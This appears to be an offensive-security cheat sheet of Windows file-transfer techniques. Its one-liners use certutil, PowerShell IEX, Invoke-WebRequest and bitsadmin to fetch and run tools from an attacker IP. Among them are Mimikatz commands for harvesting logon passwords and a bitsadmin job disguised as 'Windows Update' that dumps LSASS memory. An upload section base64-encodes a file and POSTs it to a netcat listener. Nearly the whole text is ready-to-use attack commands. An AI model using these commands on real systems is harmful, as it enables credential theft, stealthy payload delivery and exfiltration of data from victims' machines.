# File Transgers

## File Download

1. Certutil:

    ```powershell
    certutil -urlcache -split -f http://IP_ADDRESS/PowerLine.exe PowerLine.exe
    PowerLine.exe Invoke-Mimikatz "Invoke-Mimikatz -Command \"'\"sekurlsa::logonPasswords'\"\""
    ```
2. Powershell
    ```powershell
    powershell "IEX (New-Object Net.WebClient).DownloadString('http://IP_ADDRESS/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
    ```
3. IEX
    ```powershell
    IEX (New-Object Net.WebClient).DownloadString('http://IP_ADDRESS/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '"privilege::debug" "misc::memssp"'
    ```
4. WebRequest
    ```powershell
    Invoke-WebRequest -Uri http://IP_ADDRESS/WinNC.exe -outfile WinNC.exe
    ```
5. Bitsadmin 1

    ```powershell
    bitsadmin /Create "Windows Update" 
    bitsadmin /AddFile "Windows Update" https://IP_ADDRESS/Procdump.exe %TEMP%\kb7468656d.exe 
    bitsadmin /SetNotifyFlags "Windows Update" 1
    bitsadmin /SetNotifyCmdLine "Windows Update" "%COMSPEC%" "cmd.exe /c bitsadmin.exe /complete \"Windows Update\" && start /B %TEMP%\kb7468656d.exe -accepteula -ma lsass.exe  %temp%\lsassdump"
    bitsadmin /Resume "Windows Update" 
    ```
6. Bitsadmin 2
    ```powershell
    bitsadmin /transfer n http://IP_ADDRESS/WinNC.exe %TEMP%\WinNC.exe
    Import-Module bitstransfer;Start-BitsTransfer -Source "http://IP_ADDRESS/WinNC.exe" -Destination "%TEMP%\WinNC.exe"
    ```
## File Upload

1. WebRequest

> Client 
```powershell
$Fileb64 = [System.convert]::ToBase64String((Get-Content -Path 'FILE_PATH' -Encoding Byte))
Invoke-WebRequest -Uri http://IP_ADDRESS:PORT -Method POST -Body $Fileb64
```
> Server

```powershell
nc -lp PORT > Fileb64
cat Fileb64 | base64 -d -w 0 > FILE_PATH
```